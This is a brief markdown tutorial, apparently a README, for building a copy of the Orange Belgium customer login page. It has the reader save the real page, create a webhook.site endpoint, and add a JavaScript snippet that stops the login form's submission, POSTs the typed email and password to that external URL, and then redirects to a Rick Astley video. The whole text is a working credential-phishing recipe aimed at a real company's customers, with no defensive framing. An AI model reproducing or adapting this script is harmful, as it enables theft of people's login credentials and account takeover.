# Simulate the Orange Customer Connexion Webpage

## 1) Get the source code of the page

- Go to : https://www.orange.be/fr/e-services/login
- ctrl + s or right click and "save as"

## 2) Get a webhook

- Go to : webhook.site
- Copy the url (you gonna need it soon)

## 3) Write a script to return info to webhook

- open a new JS file here ´data.JS´
- write this script
> ´ let myForm = document.getElementById('sso-form');
>  let formEmail = document.getElementById('sso-email');
>  let formPassword = document.getElementById('sso-password');
>  
>  myForm.addEventListener('submit', (e) => {
>    e.preventDefault();
>   fetch('https://webhook.site/ccbd4eb0-f4b0-48c0-96da-4a96ab73004c', {
>       method: "POST",
>        body: JSON.stringify({
>            username: formEmail.value,
>            password: formPassword.value
>        })
>    }).then(window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
>  })`
